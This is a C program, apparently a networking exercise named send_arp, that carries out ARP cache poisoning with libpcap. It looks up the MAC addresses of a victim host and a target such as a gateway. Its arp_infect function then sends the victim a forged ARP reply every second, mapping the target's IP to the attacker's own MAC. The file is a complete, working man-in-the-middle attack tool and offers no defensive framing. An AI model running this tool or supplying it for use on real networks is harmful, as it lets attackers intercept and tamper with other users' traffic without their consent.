#include <unistd.h>
#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>

#define ARP_REPLY 0
#define ARP_REQUEST 1

const char* dev;
pcap_t* handle;

struct addr{
	uint8_t mac[6];
	uint8_t ip[4];
};

struct addr myaddr,sender,target;

void usage(){
	printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

void get_ip_mac(struct addr *addr,const char* dev){
	int s;
	struct ifreq ifr;
	s=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	if(s==-1){perror("socket");exit(1);}
		
	memset(&ifr,0,sizeof(ifr));
	strcpy(ifr.ifr_name,dev);

	if(ioctl(s,SIOCGIFADDR,&ifr)==-1){perror("ioctl");exit(1);}
	memcpy(addr->ip,&(((struct sockaddr_in* )&ifr.ifr_addr)->sin_addr),4);

	if(ioctl(s,SIOCGIFHWADDR,&ifr)==-1){perror("ioctl");exit(1);}
	memcpy(addr->mac,ifr.ifr_hwaddr.sa_data,6);
}

void print_mac(uint8_t* mac){
	for(int i=0;i<5;i++)printf("%02x:",mac[i]);
	printf("%02x\n",mac[5]);
}

void print_ip(uint8_t* ip){
	for(int i=0;i<3;i++)printf("%d.",ip[i]);
	printf("%d\n",ip[3]);
}

void construct_eth(struct ether_header* eth, uint8_t* dst_mac, uint8_t* src_mac){
	memcpy(eth->ether_dhost,dst_mac,6);
	memcpy(eth->ether_shost,src_mac,6);
	eth->ether_type=htons(ETHERTYPE_ARP);
}

void construct_arp(struct ether_arp *arp, uint8_t* dst_mac, uint8_t* src_mac, uint8_t* dst_ip, uint8_t* src_ip, int opcode){
	arp->arp_hrd=htons(ARPHRD_ETHER);
	arp->arp_pro=htons(ETHERTYPE_IP);
	arp->arp_hln=ETHER_ADDR_LEN;
	arp->arp_pln=sizeof(in_addr_t);
	if(opcode==ARP_REQUEST) arp->arp_op=htons(ARPOP_REQUEST);
	else if(opcode==ARP_REPLY) arp->arp_op=htons(ARPOP_REPLY);
	
	if(dst_mac!=NULL)memcpy(arp->arp_tha,dst_mac,6);
	else memset(arp->arp_tha,'\x00',6);
	memcpy(arp->arp_sha,src_mac,6);
	
	memcpy(arp->arp_tpa,dst_ip,4);
	memcpy(arp->arp_spa,src_ip,4);
}

void combine(uint8_t* frame, struct ether_header *eth, struct ether_arp *arp){
	memset(frame,'\x00',sizeof(struct ether_header)+sizeof(struct ether_arp));
	memcpy(frame,eth,sizeof(struct ether_header));
	memcpy(frame+sizeof(struct ether_header),arp,sizeof(struct ether_arp));
}

void get_othermac(struct addr* sender, struct addr* target){
	const uint8_t* packet;
	int res;
	struct pcap_pkthdr* header;
	struct ether_header eth;
	struct ether_arp arp;
	uint8_t* frame=(uint8_t*)malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));

	construct_eth(&eth,"\xff\xff\xff\xff\xff\xff",sender->mac);
	construct_arp(&arp,NULL,sender->mac,target->ip,sender->ip,ARP_REQUEST);
	combine(frame,&eth,&arp);

	if(pcap_sendpacket(handle,frame,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
		free(frame);
		pcap_perror(handle,0);
		pcap_close(handle);
		exit(1);
	}
	while(1){
		res=pcap_next_ex(handle,&header,&packet);
		if(res==0)continue;
		else if(res==-1||res==-2){free(frame);break;}
		
		struct ether_header *eth_recv;
		eth_recv=(struct ether_header*)packet;

		if(ntohs(eth_recv->ether_type)==ETHERTYPE_ARP){
			struct ether_arp *arp_recv;
			arp_recv=(struct ether_arp*)(packet+sizeof(struct ether_header));

			if(!memcmp(arp_recv->arp_spa,target->ip,4)){
				printf("arp response!!\n");
				printf("%s mac address : ",inet_ntoa(*(struct in_addr*)target->ip));
				memcpy(target->mac,&packet[6],6);
				print_mac(target->mac);
				free(frame);
				break;
			}
		}
	}
}

void arp_infect(struct addr* myaddr, struct addr* sender, struct addr* target){
	struct ether_header fake_eth;
	struct ether_arp fake_arp;
	uint8_t* fake_frame=(uint8_t*)malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));

	construct_eth(&fake_eth,sender->mac,myaddr->mac);
	construct_arp(&fake_arp,sender->mac,myaddr->mac,sender->ip,target->ip,ARP_REPLY);
	combine(fake_frame,&fake_eth,&fake_arp);

	printf("=============================================\n");
	printf("victim : %s\n",inet_ntoa(*(struct in_addr*)sender->ip));
	printf("%s mac address change\nfrom : ",inet_ntoa(*(struct in_addr*)target->ip));
	print_mac(target->mac);printf("to   : ");
	print_mac(myaddr->mac);
	printf("arp infect start\n");
	printf("=============================================\n");

	while(1){
		if(pcap_sendpacket(handle,fake_frame,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
		free(fake_frame);
		pcap_perror(handle,0);
		pcap_close(handle);
		exit(1);
		}
		printf("send fake_arp packet to %s!!\n",inet_ntoa(*(struct in_addr*)sender->ip));
		sleep(1);
	}
	
}

int main(int argc, const char* argv[]){
	if(argc !=4){
		usage();
		return -1;
	}
	dev=argv[1];

	char errbuf[PCAP_ERRBUF_SIZE];
	handle=pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
	if(handle==NULL){
		fprintf(stderr,"couldn't op en device %s: %s\n",dev,errbuf);
		return -1;
	}

	get_ip_mac(&myaddr,dev);
	printf("my ip : ");
	print_ip(myaddr.ip);
	printf("my mac : ");
	print_mac(myaddr.mac);

	inet_pton(AF_INET,argv[2],sender.ip);
	inet_pton(AF_INET,argv[3],target.ip);
	get_othermac(&myaddr,&sender);
	get_othermac(&myaddr,&target);

	arp_infect(&myaddr,&sender,&target);
}
